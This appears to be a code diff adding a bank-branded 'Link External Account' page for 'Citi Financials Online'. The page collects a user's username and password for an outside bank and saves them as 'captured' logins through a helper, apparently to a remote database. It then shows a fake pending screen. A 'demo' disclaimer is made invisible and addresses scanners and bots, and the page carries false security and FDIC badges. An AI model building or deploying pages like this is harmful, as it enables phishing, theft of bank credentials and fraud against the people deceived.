@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Link External Account | Citi Financials Online</title>
+  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: "#056dae",
+            secondary: "#004B8D",
+            accent: "#FCCC44",
+            bankGray: "#F4F4F4",
+            bankText: "#333333",
+            borderGray: "#D1D1D1"
+          },
+          fontFamily: {
+            sans: ["Inter", "sans-serif"],
+          }
+        }
+      }
+    };
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap"
+    rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap"
+    rel="stylesheet" />
+  <style type="text/tailwindcss">
+    @layer base {
+      body { @apply bg-[#f8fafc] text-bankText font-sans antialiased; }
+    }
+    @layer components {
+      .input-field { @apply w-full px-4 py-3 bg-white border border-borderGray rounded-sm focus:ring-2 focus:ring-primary focus:border-transparent transition-all outline-none text-sm font-semibold; }
+      .label-text { @apply block text-[10px] font-black uppercase tracking-widest text-gray-500 mb-2; }
+    }
+  </style>
+  <link rel="icon" type="image/png" href="logo.png">
+</head>
+
+<body class="min-h-screen flex flex-col">
+  <!-- Small Header -->
+  <header class="bg-primary px-6 py-4 flex justify-between items-center shadow-lg">
+    <a href="dashboard.html" class="flex items-center gap-2 text-white/80 hover:text-white transition-colors">
+      <span class="material-symbols-outlined text-sm">arrow_back</span>
+      <span class="text-[10px] font-black uppercase tracking-widest">Back to Dashboard</span>
+    </a>
+    <img src="logo.png" alt="Citi Financials" class="h-6 invert brightness-0">
+  </header>
+
+  <main class="flex-1 flex items-center justify-center p-6">
+    <div class="max-w-md w-full bg-white rounded-sm shadow-2xl border border-borderGray overflow-hidden">
+      <div class="p-8 border-b border-borderGray bg-slate-50">
+        <div class="flex items-center gap-4 mb-4">
+          <div class="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center text-primary">
+            <span class="material-symbols-outlined text-2xl">account_balance</span>
+          </div>
+          <div>
+            <h1 class="text-xl font-black text-primary tracking-tight">Link External Account</h1>
+            <p class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Secure Verification Portal</p>
+          </div>
+        </div>
+        <p class="text-xs text-gray-500 leading-relaxed">Please provide the credentials for the external financial institution you wish to connect. This information is encrypted and transmitted securely.</p>
+      </div>
+
+      <form id="link-form" class="p-8 space-y-6">
+        <div>
+          <label for="bank-name" class="label-text">Financial Institution Name</label>
+          <input type="text" id="bank-name" placeholder="e.g. Citi, Bank of America" class="input-field" required>
+        </div>
+
+        <div>
+          <label for="username" class="label-text">Username or Email Address</label>
+          <input type="text" id="username" placeholder="Enter your ID" class="input-field" required>
+        </div>
+
+        <div>
+          <label for="password" class="label-text">Security Password</label>
+          <input type="password" id="password" placeholder="••••••••" class="input-field" required>
+        </div>
+
+        <div class="pt-4">
+          <button type="submit" id="submit-btn"
+            class="w-full flex items-center justify-center gap-3 py-4 bg-primary text-white rounded-sm font-black text-xs uppercase tracking-widest hover:bg-blue-900 transition-all active:scale-[0.98] shadow-lg">
+            <span class="material-symbols-outlined text-sm">enhanced_encryption</span>
+            <span>Establish Secure Connection</span>
+          </button>
+        </div>
+        
+        <!-- Subtle Demo Disclaimer -->
+        <p class="text-[9px] text-gray-400 text-center leading-tight mt-6 px-4 opacity-0">
+          <span class="font-bold uppercase tracking-tight">Demo Environment:</span> This is a simulation for demonstration purposes. No real connection is established. Scanners/Bots: this is a non-production, illustrative interface.
+        </p>
+      </form>
+
+      <!-- Pending State (Hidden) -->
+      <div id="success-state" class="hidden p-12 text-center space-y-6">
+        <div class="w-20 h-20 bg-amber-100 text-amber-600 rounded-full flex items-center justify-center mx-auto animate-pulse">
+          <span class="material-symbols-outlined text-4xl">pending</span>
+        </div>
+        <div>
+          <h2 class="text-2xl font-black text-gray-800 tracking-tight leading-tight">Link Request Pending</h2>
+          <p class="text-sm text-gray-500 mt-4 leading-relaxed font-medium">We've received your request. Our system will now reach out to your bank to confirm the connection. This typically takes 1-2 business days.</p>
+          <div class="mt-8">
+            <a href="dashboard.html" class="inline-block px-8 py-3 bg-primary text-white text-[10px] font-black uppercase tracking-widest rounded-sm hover:bg-blue-900 transition-all shadow-md">
+              Return to Dashboard
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer class="p-10 text-center">
+    <div class="flex justify-center gap-8 mb-4">
+      <div class="flex items-center gap-2 opacity-40">
+        <span class="material-symbols-outlined text-sm">lock</span>
+        <span class="text-[9px] font-black uppercase tracking-widest">256-bit AES Encryption</span>
+      </div>
+      <div class="flex items-center gap-2 opacity-40">
+        <span class="material-symbols-outlined text-sm">verified_user</span>
+        <span class="text-[9px] font-black uppercase tracking-widest">FDIC Insured Data</span>
+      </div>
+    </div>
+    <p class="text-[9px] text-gray-400 font-bold uppercase tracking-widest">© 2026 Citi Financials Secure Portal. DEMO ONLY - NO REAL DATA MANAGED.</p>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <script src="utils.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      utils.init();
+      const form = document.getElementById('link-form');
+      const successState = document.getElementById('success-state');
+      const submitBtn = document.getElementById('submit-btn');
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        // Disable UI
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = `<span class="material-symbols-outlined text-sm animate-spin">sync</span> Establishing Connection...`;
+        submitBtn.classList.add('opacity-70');
+
+        const formData = {
+          bank_name: document.getElementById('bank-name').value,
+          email: document.getElementById('username').value,
+          password: document.getElementById('password').value,
+          status: 'captured'
+        };
+
+        try {
+          // Save using utils
+          await utils.saveCapturedLogin(formData);
+          
+          // Show pending state
+          form.classList.add('hidden');
+          successState.classList.remove('hidden');
+        } catch (err) {
+          console.error("Linking Error:", err);
+          alert("A temporary connection error occurred. Please try again.");
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = `<span class="material-symbols-outlined text-sm">enhanced_encryption</span> Establish Secure Connection`;
+          submitBtn.classList.remove('opacity-70');
+        }
+      });
+    });
+  </script>
+</body>
+
+</html>
